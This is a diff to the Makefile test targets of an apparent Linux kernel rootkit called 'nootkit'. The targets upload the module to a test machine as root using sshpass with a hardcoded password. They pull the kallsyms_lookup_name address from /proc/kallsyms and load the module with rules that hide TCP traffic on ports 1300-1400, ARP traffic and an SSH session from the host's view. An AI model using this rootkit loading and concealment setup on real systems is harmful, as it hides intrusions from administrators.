@@ -24,13 +24,28 @@ test-remove:
 test-upload: build
 	sshpass -pa scp nootkit.ko root@${TEST_IP}:/
 
+test-hide-packets: build test-remove test-upload
+	sshpass -pa ssh root@${TEST_IP} \
+	insmod /nootkit.ko \
+	' \
+	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
+	"hide_packets=\" \
+	ETH PROTO = 0; ETH SRC = 00:00:00:00:00:00; ETH DST = 00:00:00:00:00:00; IP PROTO = 6; IP SRC = 0.0.0.0/0.0.0.0:0-65535; IP DST = 0.0.0.0/0.0.0.0:1300-1350;, \
+	ETH PROTO = 0806; ETH SRC = 00:00:00:00:00:00; ETHDST = 00:00:00:00:00:00; IPPROTO = 0; IP SRC = 0.0.0.0/0.0.0.0:0-65535; IP DST = 0.0.0.0/0.0.0.0:0-65535; \
+	\"" \
+	"hide_sockets=\" \
+	IPPROTO = 6; LOCAL = 0.0.0.0/0.0.0.0:1300-1400; FOREIGN = 0.0.0.0/0.0.0.0:0-65535; \
+	\"" \
+	'
+
 test-hide-socket: build test-remove test-upload
 	sshpass -pa ssh root@${TEST_IP} \
 	insmod /nootkit.ko \
 	' \
 	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
 	"hide_sockets=\" \
-	PROTO = 1; LOCAL = 0.0.0.0/0.0.0.0:1300-1400; FOREIGN = 0.0.0.0/0.0.0.0:0-65535; 	\
+	IPPROTO = 6; LOCAL = 0.0.0.0/0.0.0.0:1300-1400; FOREIGN = 0.0.0.0/0.0.0.0:0-65535;, \
+	IPPROTO = 6; LOCAL = 0.0.0.0/0.0.0.0:22-22; FOREIGN = 192.168.122.1/255.255.255.255:48526-48526; \
 	\"" \
 	'
 
